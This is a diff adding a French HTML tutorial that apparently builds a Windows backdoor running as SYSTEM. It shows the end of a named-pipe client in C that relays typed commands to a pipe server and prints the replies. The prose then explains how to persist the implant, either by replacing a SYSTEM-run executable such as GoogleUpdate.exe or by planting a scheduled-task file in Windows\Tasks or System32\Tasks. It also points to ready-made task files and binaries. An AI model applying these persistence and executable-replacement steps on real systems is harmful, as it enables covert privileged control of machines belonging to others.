+        {
+            _tprintf(_T(&quot;Could not open pipe: 20 second wait timed out.&quot;));
+            return -1;
+        }
+    } // fin while acces pipe
+
+    // The pipe connected; change to message-read mode.
+    dwMode = PIPE_READMODE_MESSAGE | PIPE_WAIT;
+    fSuccess = SetNamedPipeHandleState(
+        hPipe,    // pipe handle
+        &amp;dwMode,  // new pipe mode
+        NULL,     // don't set maximum bytes
+        NULL);    // don't set maximum time
+    if (!fSuccess)
+    {
+        _tprintf( _T(&quot;SetNamedPipeHandleState failed. GLE=%lu\n&quot;), GetLastError() );
+        return -1;
+    }
+
+	memset((void *)&amp;chBuf, 0, sizeof(TCHAR) * BUFSIZE);
+
+	//  On lit la banniere d'accueil
+    fSuccess = ReadFile(
+                   hPipe,    // pipe handle
+                   chBuf,    // buffer to receive reply
+                   BUFSIZE * sizeof(TCHAR),  // size of buffer
+                   &amp;cbRead,  // number of bytes read
+                   NULL);    // not overlapped
+	chBuf[cbRead / sizeof(TCHAR)] = '\0';
+	_tprintf(_T(&quot;%s\n&quot;), chBuf);
+
+    while(1)
+    {
+        // Send a message to the pipe server.
+		memset(message, 0, 499);
+        fgets(message, 499, stdin);
+        cbToWrite = strlen(message);
+		mbstowcs_s(&amp;convertedChars, wmessage, cbToWrite, message, _TRUNCATE);
+        if (strncmp(message, &quot;QUIT&quot;, 4) == 0) break;
+
+        fSuccess = WriteFile(
+            hPipe,                  // pipe handle
+            wmessage, //lpvMessage, // message
+            convertedChars * sizeof(TCHAR), // message length
+            &amp;cbWritten,         // bytes written
+            NULL);                  // not overlapped
+
+        if (!fSuccess)
+        {
+            _tprintf(_T(&quot;WriteFile to pipe failed. GLE=%lu\n&quot;), GetLastError() );
+            return -1;
+        }
+
+		memset((void *)&amp;chBuf, 0, sizeof(TCHAR) * BUFSIZE);
+        do
+        {
+            // Read from the pipe.
+            fSuccess = ReadFile(
+                hPipe,    // pipe handle
+                chBuf,    // buffer to receive reply
+                BUFSIZE * sizeof(TCHAR),  // size of buffer
+                &amp;cbRead,  // number of bytes read
+                NULL);    // not overlapped
+             chBuf[cbRead / sizeof(TCHAR)] = '\0';
+
+             if (!fSuccess &amp;&amp; GetLastError() != ERROR_MORE_DATA) break;
+
+            _tprintf(_T(&quot;%s\n&quot;), chBuf);
+        } while (!fSuccess);  // repeat loop if ERROR_MORE_DATA
+
+        if(!fSuccess)
+        {
+            _tprintf(_T(&quot;ReadFile from pipe failed. GLE=%d\n&quot;), (int)GetLastError());
+            return -1;
+        }
+    }
+
+    CloseHandle(hPipe);
+    return 0;
+}
+</pre>
+
+<p>Une fois les deux codes compilés, soit vous remplacez l'un des exécutable existant lancé en tant que SYSTEM (exemple: GoogleUpate.exe), soit en plus de placer votre exe sur le système vous y placez aussi un nouveau fichier permettant de définir une tache planifiée.<br />
+Sous les anciennes versions de Windows (Win2K, XP et Server 2003) les taches planifiées sont dans un format binaire avec une extension .job. Ces fichiers se trouvent dans le dossier Windows\Tasks du système. La documentation qui définit ce format <a href="http://msdn.microsoft.com/en-us/library/cc248285(v=PROT.10).aspx">est disponible sur MSDN</a>. C'est un format qui semble portable d'une machine à l'autre, il est normalement possible de prendre le fichier .job d'une bécane pour le déplacer vers une autre bécane. La seule difficulté est de définir un job UUID qui n'est pas déjà utilisé. Pour créer un .job on utilisera simplement l'outil de gestion de taches planifiés de Windows.<br />
+<br />
+Sur les &quot;nouvelles&quot; versions de Windows (Vista, 7, et Server 2008), c'est encore plus simple car Microsoft est passé à un format XML. Toutefois les .job sont toujours acceptés par compatibilité et l'outil de gestion des taches permet d'importer / d'exporter dans un format ou l'autre. On peut donc reprendre facilement un XML d'une tache existante pour l'adapter à nos besoins. La seule règle à suivre semble être que ces fichiers soient encodés en UTF-16 et commencent par le BOM unicode associé.<br />
+Ces fichiers sont situés dans Windows\System32\Tasks et l'arborescence est laissée aux éditeurs logiciels (Microsoft suit sa propre arborescence, beaucoup d'éditeurs laissent leurs fichiers à la base).<br />
+En regardant le contenu d'un de ces fichiers vous devriez tout de suite capter à quoi correspond chaque balise. Il y a tout de même <a href="http://msdn.microsoft.com/en-us/library/windows/desktop/aa383611(v=VS.85).aspx">de bonnes références sur MSDN</a>.</p>
+
+<p>Dans <a href="../data/systembd">le dossier contenant les codes sources et les binaires</a>, vous trouverez aussi à titre d'exemple les fichiers de tache planifié correspondant à GoogleUpdate et Windows Defender.</p>
+  </body>
+</html>
